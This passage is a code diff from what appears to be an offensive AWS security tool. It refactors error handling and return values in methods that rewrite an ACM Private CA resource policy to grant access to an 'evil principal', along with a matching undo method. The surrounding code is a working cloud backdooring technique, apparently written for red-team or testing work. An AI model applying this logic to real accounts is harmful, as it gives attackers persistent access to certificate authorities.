@@ -58,11 +58,19 @@ class AcmPrivateCertificateAuthority(ResourceType, ABC):
         )
         return policy_document
 
-    def set_rbp(self, evil_policy: dict) -> dict:
+    def set_rbp(self, evil_policy: dict) -> ResponseMessage:
         new_policy = json.dumps(evil_policy)
         # https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/acm-pca.html#ACMPCA.Client.put_policy
-        self.client.put_policy(ResourceArn=self.arn, Policy=new_policy)
-        return evil_policy
+        try:
+            self.client.put_policy(ResourceArn=self.arn, Policy=new_policy)
+            message = "success"
+        except botocore.exceptions.ClientError as error:
+            message = str(error)
+        response_message = ResponseMessage(message=message, operation="set_rbp", evil_principal="",
+                                           victim_resource_arn=self.arn, original_policy=self.original_policy,
+                                           updated_policy=evil_policy, resource_type=self.resource_type,
+                                           resource_name=self.name, service=self.service)
+        return response_message
 
     def add_myself(self, evil_principal: str, dry_run: bool = False) -> ResponseMessage:
         """Add your rogue principal to the AWS resource"""
@@ -111,16 +119,16 @@ class AcmPrivateCertificateAuthority(ResourceType, ABC):
 
         if dry_run:
             operation = "DRY_RUN_ADD_MYSELF"
-            message = f"The resource policy will be added to {self.arn}"
+            message = operation
         else:
             operation = "ADD_MYSELF"
             self.undo(evil_principal=evil_principal)
-            # new_policy = self.set_rbp(evil_policy=evil_policy)
-            evil_policy = self.set_rbp(evil_policy=evil_policy)
-            message = f"Added resource policy to {self.arn}"
+            set_rbp_response = self.set_rbp(evil_policy=evil_policy)
+            message = set_rbp_response.message
         response_message = ResponseMessage(message=message, operation=operation, evil_principal=evil_principal,
                                            victim_resource_arn=self.arn, original_policy=self.original_policy,
-                                           updated_policy=evil_policy, resource_type=self.resource_type, resource_name=self.name)
+                                           updated_policy=evil_policy, resource_type=self.resource_type,
+                                           resource_name=self.name, service=self.service)
         return response_message
 
     def undo(self, evil_principal: str, dry_run: bool = False) -> ResponseMessage:
@@ -135,7 +143,8 @@ class AcmPrivateCertificateAuthority(ResourceType, ABC):
             message = f"The resource policy for {self.arn} will be deleted."
         response_message = ResponseMessage(message=message, operation=operation, evil_principal=evil_principal,
                                            victim_resource_arn=self.arn, original_policy=self.original_policy,
-                                           updated_policy=new_policy, resource_type=self.resource_type, resource_name=self.name)
+                                           updated_policy=new_policy, resource_type=self.resource_type,
+                                           resource_name=self.name, service=self.service)
         return response_message
 
 
